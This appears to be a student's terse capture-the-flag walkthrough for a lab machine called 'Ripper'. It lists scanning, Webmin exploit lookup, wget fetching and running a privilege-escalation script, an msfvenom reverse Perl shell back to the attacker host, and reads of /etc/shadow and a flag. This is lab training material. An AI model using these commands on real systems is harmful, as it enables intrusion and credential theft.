# Ripper 192.168.56.111
## Andrea Zonnekus 18758119

netdiscover -i eth0

![](ripper_steps/Aspose.Words.37415f79-ccba-486b-9eba-3deb0bf2aa7b.001.png)

sudo nmap -p- -sV -O 192.168.56.111 -oN host

![](ripper_steps/Aspose.Words.37415f79-ccba-486b-9eba-3deb0bf2aa7b.002.png)

sudo gobuster dir -u 192.168.2.9 -w /usr/share/dirb/wordlists/big.txt -o http\_enum -x php,html,js,txt,aspx

![](ripper_steps/Aspose.Words.37415f79-ccba-486b-9eba-3deb0bf2aa7b.003.png)



<https://ripper-min:10000/>

![](ripper_steps/Aspose.Words.37415f79-ccba-486b-9eba-3deb0bf2aa7b.004.png)

![](ripper_steps/Aspose.Words.37415f79-ccba-486b-9eba-3deb0bf2aa7b.005.png)

nmap -sV -T4 -p 10000 192.168.56.111

![](ripper_steps/Aspose.Words.37415f79-ccba-486b-9eba-3deb0bf2aa7b.006.png)

searchsploit webmin

![](ripper_steps/Aspose.Words.37415f79-ccba-486b-9eba-3deb0bf2aa7b.007.png)

searchsploit -m /usr/share/exploitdb/exploits/linux/webapps/47293.sh

![](ripper_steps/Aspose.Words.37415f79-ccba-486b-9eba-3deb0bf2aa7b.008.png)

sudo gobuster dir fuzz -u 192.168.56.111 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

![](ripper_steps/Aspose.Words.37415f79-ccba-486b-9eba-3deb0bf2aa7b.009.png)

![](ripper_steps/Aspose.Words.37415f79-ccba-486b-9eba-3deb0bf2aa7b.010.png)

![](ripper_steps/Aspose.Words.37415f79-ccba-486b-9eba-3deb0bf2aa7b.011.png)

ssh <ripper@192.168.56.111>

![](ripper_steps/Aspose.Words.37415f79-ccba-486b-9eba-3deb0bf2aa7b.012.png)

![](ripper_steps/Aspose.Words.37415f79-ccba-486b-9eba-3deb0bf2aa7b.013.png)

touch tst.txt

![](ripper_steps/Aspose.Words.37415f79-ccba-486b-9eba-3deb0bf2aa7b.014.png)

python -m http.server 80

![](ripper_steps/Aspose.Words.37415f79-ccba-486b-9eba-3deb0bf2aa7b.015.png)

wget 192.168.56.101/les.sh

![](ripper_steps/Aspose.Words.37415f79-ccba-486b-9eba-3deb0bf2aa7b.016.png)

./les.sh

![](ripper_steps/Aspose.Words.37415f79-ccba-486b-9eba-3deb0bf2aa7b.017.png)

![](ripper_steps/Aspose.Words.37415f79-ccba-486b-9eba-3deb0bf2aa7b.018.png)

wget 192.168.56.101/exploit.c

![](ripper_steps/Aspose.Words.37415f79-ccba-486b-9eba-3deb0bf2aa7b.019.png)

sadly no clang, gcc or cc makes this not work

use guide because don’t know anymore

ls

cat secret.file

![](ripper_steps/Aspose.Words.37415f79-ccba-486b-9eba-3deb0bf2aa7b.020.png)

su cubes

![](ripper_steps/Aspose.Words.37415f79-ccba-486b-9eba-3deb0bf2aa7b.021.png)

ls webmin/backup -lah

![](ripper_steps/Aspose.Words.37415f79-ccba-486b-9eba-3deb0bf2aa7b.022.png)

cat webmin/backup/miniser.log

![](ripper_steps/Aspose.Words.37415f79-ccba-486b-9eba-3deb0bf2aa7b.023.png)

![](ripper_steps/Aspose.Words.37415f79-ccba-486b-9eba-3deb0bf2aa7b.024.png)

![](ripper_steps/Aspose.Words.37415f79-ccba-486b-9eba-3deb0bf2aa7b.025.png)

cat /etc/pam.d/common-password

![](ripper_steps/Aspose.Words.37415f79-ccba-486b-9eba-3deb0bf2aa7b.026.png)

msfvenom -p cmd/unix/reverse\_perl LHOST=192.168.56.101 LPORT=4444 -o shell.pl

![](ripper_steps/Aspose.Words.37415f79-ccba-486b-9eba-3deb0bf2aa7b.027.png)

![](ripper_steps/Aspose.Words.37415f79-ccba-486b-9eba-3deb0bf2aa7b.028.png)

go to Command Shell

![](ripper_steps/Aspose.Words.37415f79-ccba-486b-9eba-3deb0bf2aa7b.029.png)



cat flag.txt

![](ripper_steps/Aspose.Words.37415f79-ccba-486b-9eba-3deb0bf2aa7b.030.png)

cat /etc/shadow

![](ripper_steps/Aspose.Words.37415f79-ccba-486b-9eba-3deb0bf2aa7b.031.png)

![](ripper_steps/Aspose.Words.37415f79-ccba-486b-9eba-3deb0bf2aa7b.032.png)
